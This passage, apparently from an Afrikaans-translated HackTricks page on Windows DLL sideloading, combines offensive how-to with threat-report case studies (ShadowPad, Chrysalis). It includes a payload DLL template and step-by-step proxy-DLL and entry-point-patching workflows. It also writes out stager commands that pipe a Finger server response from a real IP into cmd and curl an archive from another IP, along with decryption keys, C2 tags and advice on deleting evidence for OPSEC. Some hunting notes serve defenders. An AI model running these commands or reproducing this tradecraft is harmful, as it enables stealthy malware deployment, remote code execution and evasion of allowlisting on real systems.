- Wanneer die signed EXE begin, laai Windows DLL search order wsc.dll eerste vanaf die working directory, en execute attacker code onder 'n signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Soek vir entries wat executables of VBScript loop. Voorbeeld suspicious pattern: LaunchApplication wat 'n embedded file in background execute.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence en Binary tables.
- Embedded/split payloads in die MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Of gebruik lessmsi: lessmsi x package.msi C:\out
- Soek vir multiple small fragments wat deur 'n VBScript CustomAction concatenated en decrypted word. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee files in dieselfde folder:
- wsc_proxy.exe: wettige gesigneerde host (Avast). Die proses probeer om wsc.dll by name uit sy directory te laai.
- wsc.dll: attacker DLL. As geen spesifieke exports vereis word nie, kan DllMain voldoende wees; andersins, bou 'n proxy DLL en stuur vereiste exports aan na die egte library terwyl payload in DllMain loop.
- Bou 'n minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir export requirements, use 'n proxying framework (e.g., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek steun op DLL name resolution deur die host binary. As die host absolute paths of safe loading flags gebruik (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan hijack faal.
- KnownDLLs, SxS, en forwarded exports kan precedence beïnvloed en moet in ag geneem word tydens keuse van die host binary en export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi met 'n **three-file triad** om in te meng met legit software terwyl die core payload encrypted op disk gehou word:

1. **Signed host EXE** – vendors soos AMD, Realtek, of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die attackers hernoem die executable om soos 'n Windows binary te lyk (byvoorbeeld `conhost.exe`), maar die Authenticode signature bly geldig.
2. **Malicious loader DLL** – langs die EXE laat val met 'n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik 'n MFC binary wat met die ScatterBrain framework obfuscate is; sy enigste taak is om die encrypted blob te vind, dit te decrypt, en ShadowPad reflectively te map.
3. **Encrypted payload blob** – dikwels gestoor as `<name>.tmp` in dieselfde directory. Ná memory-mapping van die decrypted payload, delete die loader die TMP file om forensic evidence te vernietig.

Tradecraft notes:

* Deur die signed EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word), laat dit hom as 'n Windows binary masqueradeer maar die vendor signature behou, so replicate Ink Dragon se gewoonte om `conhost.exe`-lykende binaries te laat val wat eintlik AMD/NVIDIA utilities is.
* Omdat die executable trusted bly, hoef meeste allowlisting controls net jou malicious DLL langsaan te hê. Fokus daarop om die loader DLL aan te pas; die signed parent kan tipies onaangeraak loop.
* ShadowPad se decryptor verwag dat die TMP blob langs die loader leef en writable is sodat dit die file kan zero ná mapping. Hou die directory writable totdat die payload laai; sodra dit in memory is, kan die TMP file veilig vir OPSEC deleted word.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Operators pair DLL sideloading met LOLBAS sodat die enigste custom artifact op disk die malicious DLL langs die trusted EXE is:

- **Remote command loader (Finger):** Hidden PowerShell spawn `cmd.exe /c`, trek commands van 'n Finger server, en pipe dit na `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` trek TCP/79 text; `| cmd` execute die server response, wat operators toelaat om tweede fase server-side te roteer.

- **Built-in download/extract:** Download 'n archive met 'n benigne extension, unpack dit, en stage die sideload target plus DLL onder 'n random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` verdoesel progress en volg redirects; `tar -xf` gebruik Windows se built-in tar.

- **WMI/CIM launch:** Start die EXE via WMI sodat telemetry 'n CIM-created process wys terwyl dit die colocated DLL laai:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Werk met binaries wat local DLLs verkies (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) loop onder die trusted name.

- **Hunting:** Alert op `forfiles` wanneer `/p`, `/m`, en `/c` saam voorkom; ongewoon buite admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

'n Onlangse Lotus Blossom intrusion het 'n trusted update chain misbruik om 'n NSIS-packed dropper te lewer wat 'n DLL sideload plus fully in-memory payloads gestage het.

Tradecraft flow
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit **HIDDEN**, laat 'n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, 'n malicious `log.dll`, en 'n encrypted blob `BluetoothService` val, en launch dan die EXE.
- Die host EXE import `log.dll` en roep `LogInit`/`LogWrite`. `LogInit` mmap-laai die blob; `LogWrite` decrypt dit met 'n custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived van 'n vorige hash), overwrite die buffer met plaintext shellcode, free temps, en jump daarna.
- Om 'n IAT te vermy, resolve die loader APIs deur export names te hash met **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, en dan 'n Murmur-style avalanche (**0x85EBCA6B**) toe te pas en dit teen salted target hashes te compare.

Main shellcode (Chrysalis)
- Decrypt 'n PE-like main module deur add/XOR/sub met key `gQ2JR&9;` oor vyf passes te herhaal, en laai dan dinamies `Kernel32.dll` → `GetProcAddress` om import resolution klaar te maak.
- Reconstruct DLL name strings by runtime via per-character bit-rotate/XOR transforms, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik 'n tweede resolver wat die **PEB → InMemoryOrderModuleList** deurloop, elke export table in 4-byte blocks met Murmur-style mixing parse, en slegs terugval na `GetProcAddress` as die hash nie gevind word nie.

Embedded configuration & C2
- Config leef binne die laat-val `BluetoothService` file by **offset 0x30808** (size **0x980**) en word RC4-decrypted met key `qwhvb^435h&*7`, wat die C2 URL en User-Agent openbaar.
- Beacons bou 'n dot-delimited host profile, prepend tag `4Q`, en RC4-encrypt dan met key `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Responses word RC4-decrypted en via 'n tag switch gedispatch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode word deur CLI args beheer: no args = install persistence (service/Run key) wat na `-i` wys; `-i` relaunch self met `-k`; `-k` skip install en run payload.

Alternate loader observed
- Dieselfde intrusion het Tiny C Compiler laat val en `svchost.exe -nostdlib -run conf.c` vanaf `C:\ProgramData\USOShared\` uitgevoer, met `libtcc.dll` langsaan. Die attacker-supplied C source het shellcode ingebed, dit compiled, en in-memory laat loop sonder om die disk met 'n PE aan te raak. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hierdie TCC-gebaseerde compile-and-run stage het `Wininet.dll` by runtime geïmporteer en ‘n tweede-stage shellcode van ‘n hardcoded URL afgetrek, wat ’n buigsame loader gegee het wat hom voordoen as ‘n compiler run.

## Signed-host sideloading with export proxying + host thread parking

Sommige DLL sideloading chains voeg **stability engineering** by sodat die wettige host lank genoeg aan die lewe bly om later stages netjies te laai in plaas daarvan om te crash nadat die malicious DLL gelaai is.

Waargenome patroon
- Drop ‘n trusted EXE langs ‘n malicious DLL met behulp van die verwagte dependency name soos `version.dll`.
- Die malicious DLL **proxy elke verwagte export** terug na die regte system DLL (byvoorbeeld `%SystemRoot%\\System32\\version.dll`) sodat import resolution steeds slaag en die host process aanhou werk.
- Ná load, **patch** die malicious DLL die host entry point sodat die main thread in ‘n oneindige `Sleep` loop val in plaas daarvan om uit te gaan of code paths te loop wat die process sou beëindig.
- ’n Nuwe thread doen die werklike malicious werk: decrypting van die volgende-stage DLL name of path (RC4/XOR is algemeen), en dan word dit met `LoadLibrary` gelanseer.

Hoekom dit saak maak
- Normale DLL proxying behou API compatibility, maar dit waarborg nie dat die host lank genoeg aan die lewe bly vir later stages nie.
- Om die main thread in `Sleep(INFINITE)` te parkeer is ‘n eenvoudige manier om die signed process resident te hou terwyl die loader decrypting, staging, of network bootstrap in ‘n worker thread doen.
- Om net vir ’n verdagte `DllMain` te hunt, kan hierdie patroon mis as die interessante gedrag plaasvind nadat die host entry point gepatch is en ’n sekondêre thread begin.

Minimum workflow
1. Kopieer die signed host EXE en bepaal die DLL wat dit vanaf die local directory resolve.
2. Bou ‘n proxy DLL wat dieselfde functions export en dit na die legitime DLL forward.
3. In `DllMain(DLL_PROCESS_ATTACH)`, skep ‘n worker thread.
4. Vanaf daardie thread, patch die host entry point of main thread start routine sodat dit op `Sleep` loop.
5. Decrypt die volgende-stage DLL name/config en roep `LoadLibrary` of manual-map die payload.

Defensive pivots
- Signed processes wat `version.dll` of soortgelyke algemene libraries vanaf hul eie application directory laai in plaas van uit `System32`.
- Memory patches by die process entry point kort ná image load, veral jumps/calls wat na `Sleep`/`SleepEx` herlei word.
- Threads wat deur ‘n proxy DLL geskep is en onmiddellik `LoadLibrary` op ‘n tweede DLL met ‘n decrypted name aanroep.
- Full-export proxy DLLs wat langs vendor executables geplaas is binne writable staging directories soos `ProgramData`, `%TEMP%`, of unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
